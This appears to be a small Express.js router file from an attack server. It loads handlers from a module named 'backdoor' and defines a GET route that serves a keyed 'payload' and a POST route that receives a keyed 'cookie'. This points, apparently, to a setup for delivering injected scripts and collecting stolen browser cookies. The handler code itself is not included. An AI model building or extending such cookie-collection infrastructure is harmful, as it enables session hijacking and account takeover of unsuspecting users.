const express = require('express');
const router = express.Router();

const controllers = require('../controllers/backdoor');
router.get('/payload/:key', controllers.getPayload)
router.post('/cookie/:key', controllers.getCookie);

module.exports = router;